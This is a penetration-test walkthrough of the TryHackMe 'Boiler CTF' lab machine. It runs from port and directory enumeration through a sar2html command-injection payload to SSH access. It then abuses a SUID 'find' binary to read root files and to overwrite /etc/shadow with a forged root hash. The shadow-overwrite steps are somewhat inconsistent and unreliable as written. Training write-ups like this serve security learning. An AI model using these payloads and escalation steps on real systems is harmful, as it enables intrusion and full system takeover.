# Boiler CTF - Tryhackme Write Up / Walkthrough

Report by: FJA
Date of completion: 13/09/26

**Note: This write up details a penetration testing conducted in a virtual system hosted on tryhackme.com . This system was designed for training**

# Target Information:
```
Name: Boiler CTF
IP: 10.65.182.94 [it changed through out the write up, my time on the machine expired, sadly]
Operating System: Linux
```
# Tools used:
```
nmap
dirsearch
joomscan
GTFOBINS
```

# Executive Summary
***Boiler CTF*** is a virtual system hosted by the plataform TryHackMe. I've conducted a penetration testing with the goal of identifying vulnerabilities, attack vectros, exploiting vulnerabilities and gaining root access.
*Activies were conducted to simulate an attacker*

# Summary Results
Boiler CTF was a medium machine to compromise. A lot of habbit holes and distractions until you can find the right directory. The machine required to SSH in another user to obtain the first flag. Obtaing the last flag required a vulnerability inside a linux command, that leads to reading files and overwriting them.

The exploitation starts in a folder that has sar2html, which is a System Activity Reporter, this specific tool is vulnerable to Remote Command Injection (CVE-2025-34030). A low priveleged user can exploit this vulnerability and actually view the directory of www-data.
A specific .txt file shows the password of a user to the SSH. Using these credentials we can also find another password of a more privileged user. This user is able to exploit the permissions of the Operating System through the command 'find' and compromise the machine, leading to a full privileged user.


# Attack Narrative

First, enumerating the ports it's always essential to find useful information

# Enumeration:
```
nmap -p- -sCV 10.65.182.94 --min-rate 10000
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-13 16:10 -0300
Stats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 95.76% done; ETC: 16:11 (0:00:00 remaining)
Nmap scan report for 10.65.182.94
Host is up (0.23s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.192.9
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 1 disallowed entry 
|_/
10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
|_  256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
It shows 4 ports open, FTP port, 2 HTTP ports and a SSH port

The FTP port allows a anonymous login 
HTTP PORT 80 has an ubuntu page and nothing on robots.txt
HTTP PORT 10000 has a blank page
SSH PORT could be vulnerable to user enumeration (CVE-2016-6210) or Command Injection (CVE-2016-3115), but it's nor relevant
—----------------------------------------------------

# FTP

```
ftp 10.65.182.94 21                                                                                                                                                                                         
Connected to 10.65.182.94.
220 (vsFTPd 3.0.3)
Name (10.65.182.94:sa): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||48174|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
ftp> get ".info.txt"
local: .info.txt remote: .info.txt
229 Entering Extended Passive Mode (|||45351|)
150 Opening BINARY mode data connection for .info.txt (74 bytes).
100% |**********************************************************************************************************************************************************************************************|    74        0.60 KiB/s    00:00 ETA
226 Transfer complete.
74 bytes received in 00:00 (0.16 KiB/s)
```

## Inside of the .txt file:

“Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!”

Using dencode.com , we can decrypt the message:

``"Just wanted to see if you find it. Lol. Remember: Enumeration is the key!"``

(grrrr)



# Enumerating the HTTP Port (80)
***HTTP Port 10000 is irrelevant***

In the landing page, we get the ubuntu installation page. Now, conducting a directory busting / fuzzing, we can find the CMS and other directories: 

```
dirsearch -x 404 -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.65.182.94:80/ -t 400
  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: -w | HTTP method: GET | Threads: 400 | Wordlist size: 9481

Output File: /home/sa/reports/http_10.65.182.94_80/__26-09-13_16-28-54.txt

Target: http://10.65.182.94/

[16:28:54] Starting: 
[16:29:02] 403 -  298B  - /.ht_wsr.txt                                      
[16:29:03] 403 -  303B  - /.htaccess.sample                                 
[16:29:03] 403 -  302B  - /.htaccess_extra                                  
[16:29:03] 403 -  301B  - /.htaccess.bak1                                   
[16:29:03] 403 -  301B  - /.htaccess_orig                                   
[16:29:03] 403 -  301B  - /.htaccess.orig                                   
[16:29:03] 403 -  301B  - /.htaccess.save                                   
[16:29:03] 403 -  300B  - /.htaccessOLD2                                    
[16:29:03] 403 -  299B  - /.htaccessOLD                                     
[16:29:03] 403 -  299B  - /.htaccessBAK
[16:29:03] 403 -  299B  - /.htaccess_sc                                     
[16:29:03] 403 -  292B  - /.html
[16:29:03] 403 -  298B  - /.httr-oauth                                      
[16:29:03] 403 -  301B  - /.htpasswd_test                                   
[16:29:03] 403 -  297B  - /.htpasswds                                       
[16:29:04] 403 -  291B  - /.htm                                             
[16:29:07] 403 -  291B  - /.php                                             
[16:29:51] 301 -  313B  - /joomla  ->  http://10.65.182.94/joomla/           
[16:29:51] 301 -  327B  - /joomla/administrator  ->  http://10.65.182.94/joomla/administrator/
[16:29:55] 301 -  313B  - /manual  ->  http://10.65.182.94/manual/           
[16:29:55] 200 -  201B  - /manual/index.html                                 
[16:29:58] 200 -    4KB - /joomla/                                           
```
**CMS: Joomla**

After the directory busting / fuzzing we can actually retrieve what CMS the "Boiler CTF" is using. After visiting these pages we don't find anything that we could possible explore.
Now it can be conducted a joomla scan, using the tool 'joomscan' to verify more directories that can be explorable.
Note: In joomla/administrator/index.php there’s a value indicating the maximum value of a password (15), It could be used to brute forcing. (Not tested and irrelevant)

# Joomla enumeration
Using the joomscan tool, it dectects the version, vulnerabilities and a WAF. Some directories start appearing:

**Results (part of it)**
```
[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.9.12dev

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing : 
http://10.65.182.94/joomla/administrator/components
http://10.65.182.94/joomla/administrator/modules
http://10.65.182.94/joomla/administrator/templates
http://10.65.182.94/joomla/images/banners
```

Nothing very useful in these directories, navigating through these directories can be time consuming and it doesn't have valuable information, but, fuzzing through directories again and this time on the directories '/joomla/, we find a lot of new directories

## Note: I've used dirsearch again.

```
17:03:18] 301 -  320B  - /joomla/_files  ->  http://10.65.182.94/joomla/_files/
[17:03:18] 301 -  319B  - /joomla/_test  ->  http://10.65.182.94/joomla/_test/
[17:03:20] 403 -  305B  - /joomla/.ht_wsr.txt                               
[17:03:27] 301 -  327B  - /joomla/administrator  ->  http://10.65.182.94/joomla/administrator/
[17:03:27] 200 -   31B  - /joomla/administrator/cache/                       
[17:03:27] 301 -  332B  - /joomla/administrator/logs  ->  http://10.65.182.94/joomla/administrator/logs/
[17:03:27] 200 -    2KB - /joomla/administrator/                             
[17:03:27] 200 -   31B  - /joomla/administrator/logs/                        
[17:03:27] 200 -  529B  - /joomla/administrator/includes/                    
[17:03:32] 301 -  317B  - /joomla/bin  ->  http://10.65.182.94/joomla/bin/   
[17:03:32] 200 -   31B  - /joomla/bin/                                       
[17:03:33] 301 -  319B  - /joomla/build  ->  http://10.65.182.94/joomla/build/
[17:03:34] 200 -    1KB - /joomla/build.xml                                  
[17:03:34] 200 -   31B  - /joomla/cache/                                     
[17:03:34] 301 -  319B  - /joomla/cache  ->  http://10.65.182.94/joomla/cache/
[17:03:34] 200 -  668B  - /joomla/build/                                     
[17:03:36] 200 -   31B  - /joomla/cli/                                       
[17:03:36] 200 -    2KB - /joomla/codeception.yml                            
[17:03:37] 301 -  324B  - /joomla/components  ->  http://10.65.182.94/joomla/components/
[17:03:37] 200 -   31B  - /joomla/components/                                
[17:03:37] 200 -    2KB - /joomla/composer.json                              
[17:03:39] 200 -  117KB - /joomla/composer.lock                              
[17:03:39] 200 -    0B  - /joomla/configuration.php                          
[17:03:51] 200 -    1KB - /joomla/htaccess.txt                               
[17:03:52] 301 -  320B  - /joomla/images  ->  http://10.65.182.94/joomla/images/
[17:03:52] 200 -   31B  - /joomla/includes/                                  
[17:03:52] 200 -   31B  - /joomla/images/                                    
[17:03:52] 301 -  322B  - /joomla/includes  ->  http://10.65.182.94/joomla/includes/
[17:03:53] 303 -    0B  - /joomla/index.php/login/  ->  /joomla/index.php/component/users/?view=login&Itemid=104
[17:03:53] 301 -  326B  - /joomla/installation  ->  http://10.65.182.94/joomla/installation/
[17:03:54] 200 -    2KB - /joomla/installation/                              
[17:03:54] 200 -    3KB - /joomla/Jenkinsfile                                
[17:03:55] 200 - 1023B  - /joomla/karma.conf.js                              
[17:03:55] 200 -   31B  - /joomla/layouts/                                   
[17:03:55] 301 -  322B  - /joomla/language  ->  http://10.65.182.94/joomla/language/
[17:03:56] 301 -  323B  - /joomla/libraries  ->  http://10.65.182.94/joomla/libraries/
[17:03:56] 200 -   31B  - /joomla/libraries/                                 
[17:03:57] 200 -    7KB - /joomla/LICENSE.txt                                
[17:04:00] 200 -   31B  - /joomla/media/                                     
[17:04:00] 301 -  319B  - /joomla/media  ->  http://10.65.182.94/joomla/media/
[17:04:01] 200 -   31B  - /joomla/modules/                                   
[17:04:01] 301 -  321B  - /joomla/modules  ->  http://10.65.182.94/joomla/modules/
[17:04:10] 200 -  822B  - /joomla/phpunit.xml.dist                           
[17:04:10] 301 -  321B  - /joomla/plugins  ->  http://10.65.182.94/joomla/plugins/
[17:04:11] 200 -   31B  - /joomla/plugins/                                   
[17:04:15] 200 -    6KB - /joomla/README.md                                  
[17:04:15] 200 -    2KB - /joomla/README.txt                                 
[17:04:17] 200 -  392B  - /joomla/robots.txt.dist                            
[17:04:29] 301 -  323B  - /joomla/templates  ->  http://10.65.182.94/joomla/templates/
[17:04:29] 200 -   31B  - /joomla/templates/
[17:04:30] 200 -    0B  - /joomla/templates/system/                          
[17:04:30] 200 -    0B  - /joomla/templates/protostar/                       
[17:04:30] 200 -   31B  - /joomla/templates/index.html                       
[17:04:30] 200 -    0B  - /joomla/templates/beez3/
[17:04:31] 301 -  319B  - /joomla/tests  ->  http://10.65.182.94/joomla/tests/
[17:04:31] 301 -  317B  - /joomla/tmp  ->  http://10.65.182.94/joomla/tmp/   
[17:04:31] 200 -  515B  - /joomla/tests/                                     
[17:04:31] 200 -   31B  - /joomla/tmp/
[17:04:40] 200 -  628B  - /joomla/web.config.txt                             
[17:04:46] 301 -  318B  - /joomla/~www  ->  http://10.65.182.94/joomla/~www/  
```

# Exploitation 

One of the first directories to grab attention is the '/_test/' and '/_files/', accessing '/_test/' we can se a tool called sar2html. After searching the name of this tool, we can spot multilpe CVEs, and one of them being a RCE (Remote Command Injection) through the parameter:
``?plot=;`(command)``
### What it actually happens:
**The application actually fails to sanatize the user inupt before using in the system, unauthenticated attackers can inject shell commands by appending them to the plot parameter (e.g., ?plot=;id) in a crafted GET request.**
**The output is revealed through the application UI, located in Hosts, this can lead to arbitrary command execution on the underlying system.**

By executing the payload: 
``ls -la``
It reveals a .txt file that contains on of the users password to the SSH port

Using this information and SSH'ing to the port, we can actually enter in the machine:

``ssh -p 55007 basterd@ip
  superduperp@$$
``
*Note: Logging into the machine, we get what’s called a “dumb shell”, we can try and upgrade in different ways, but i’ll be using something don’t really changes a lot of things:*
``python3 -c 'import pty; pty.spawn("/bin/bash")' ``

Exploring the user directory, we find a file called 'backup.sh' containg the password of the user stoner and it's purpose (SSH)


``superduperp@$$no1knows``

*Note: try to remove the # before the actual password, otherwise, you can get very anxious or frustrated! because it was just a comment*

# Privilege Escalation

After logging as stoner into the SSH Port, we can start manually looking for vulnerabilities that will lead to Privilege Escalation:

``find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null``

A lot of functions appear, but “find” is the actual one that’s is vulnerable


Trying to use the payload of GTFOBINS (find . -exec /bin/sh -p \; -quit) doesn't work, even with sudo. Because the command make us stay the same user and privileges

Another alternative is through reading our last flag with the following command or payload:

``find /root/ -exec cat {} \; -quit``

That lead us to our last flag. But actually, there's something that most of people don't actually try.
We can transform ourselves in root, but how??


# 2ND METHOD:


We could actually and try to change the root password and become root, because the 'find' command can actually make as be able to read and write in any file.

Steps:

1st - Using the command to read files:
``find /root/ -exec cat {} \; -quit``
We'll copy everything to the following steps

2nd - Inside of the directory of stoner, create a .txt file containing everything you've just copied (/home/stoner)

3rd - Inside your own machine, create a new hash using this command:
``mkpasswd -m sha-512 (something here)``

4th - With the new hash, replace the exclamation thing that is supposed to go the hash

```
ex.:
before

root:!:18130:0:99999:7:::


after

root:$6$randomwords:18130:0:99999:7:::
```

4th - With the find command, we’ll overwrite the /etc/shadow by pasting our .txt file onto /etc/shadow

``find /etc/passwd -exec cp yourfile.txt /etc/shadow \;``

5th- Switch to the user root and using our new password you created, we can actually be root (NOT THE ACTUAL HASH)

su root
(password)

and wow!!! now you’re root

see? becoming root it’s waayy more fun

